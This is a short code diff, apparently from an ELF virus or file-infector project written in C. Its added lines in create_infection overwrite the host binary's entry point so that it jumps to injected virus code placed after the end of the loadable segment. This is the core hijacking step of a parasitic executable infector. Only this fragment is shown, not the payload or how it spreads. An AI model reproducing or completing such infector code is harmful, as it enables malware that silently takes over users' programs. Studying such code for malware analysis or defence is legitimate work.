@@ -28,11 +28,19 @@ void	add_injection(void **dst, t_elf *elf)
 
 void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 {
+	uint64_t	new_entry;
 	void		*src;
 	void		*end;
 
 	src = elf->addr;
 	end = src + elf->size;
+	memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
+	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
+	src = &elf->header->e_entry;
+	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz + virus_elf->size;
+	memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
+	dst += sizeof(elf->header->e_entry);
+	src += sizeof(elf->header->e_entry);
 	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
 	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
 	memcpy(dst, src, pt_load_size_left);
